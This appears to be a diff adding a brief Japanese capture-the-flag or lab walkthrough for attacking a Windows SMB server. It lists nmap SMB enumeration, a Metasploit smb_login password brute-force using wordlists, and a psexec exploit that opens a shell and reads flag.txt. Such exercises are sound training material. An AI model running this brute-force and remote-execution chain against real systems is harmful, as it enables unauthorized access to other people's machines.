@@ -1,0 +1,25 @@
+Demo windows:SMB サーバー PSexec
+1) nmapを使って、セキュリティホールを探索する
+2) SMBポートである445が開いている場合には、以下のコマンドで、プロトコルを一覧表示する
+nmap -p 445 --script smb-protocols ターゲットドメイン
+3) metasploitを起動して、smb_loginモジュールを実行する
+service postgresql start && msfconsole
+search smb_login
+use auxiliary/scanner/smb/smb_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set RHOSTS
+set VERBOSE false
+exploit
+4) 新しいMetasploitを起動する
+msfconsole -q
+use exploit/windows/smb/psexec
+set RHOSTS
+set SMBUser 
+set SMBPass
+exploit
+5) フラグを取得する
+shell
+cd /
+dir 
+type flag.txt
